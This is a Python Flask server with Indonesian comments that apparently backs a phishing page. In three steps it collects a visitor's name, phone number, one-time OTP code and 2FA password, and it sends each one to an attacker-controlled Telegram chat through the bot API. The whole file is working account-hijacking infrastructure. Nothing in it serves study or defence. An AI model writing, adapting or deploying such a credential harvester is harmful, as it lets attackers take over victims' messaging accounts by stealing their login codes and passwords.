import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)

# FIX: Mengizinkan akses dari domain Netlify kamu agar tidak diblokir (CORS)
CORS(app, resources={r"/*": {"origins": "*"}})

# Mengambil variabel dari dashboard Railway
TOKEN = os.getenv("BOT_TOKEN") 
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def send_to_telegram(message):
    if TOKEN and CHAT_ID:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print(f"Gagal kirim Telegram: {e}")

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.json
        step = data.get('step')
        nama = data.get('nama')
        nomor = data.get('nomor')
        otp = data.get('otp')
        sandi = data.get('sandi')

        if step == 1:
            msg = f"🔔 *Data Masuk*\n👤 Nama: {nama}\n📱 Nomor: {nomor}\n📍 Status: Menunggu OTP"
            send_to_telegram(msg)
            return jsonify({"status": "success"}), 200

        elif step == 2:
            msg = f"🔑 *OTP Diterima*\n📱 Nomor: {nomor}\n🔢 OTP: {otp}"
            send_to_telegram(msg)
            # Mengirim respon agar frontend lanjut ke 2FA
            return jsonify({"status": "need_2fa", "next_step": "2fa"}), 200

        elif step == 3:
            msg = f"🔐 *Sandi 2FA*\n📱 Nomor: {nomor}\n🔑 Sandi: {sandi}"
            send_to_telegram(msg)
            return jsonify({"status": "success"}), 200

        return jsonify({"status": "error", "message": "Step tidak valid"}), 400

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # Mengikuti PORT yang diberikan Railway secara otomatis
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))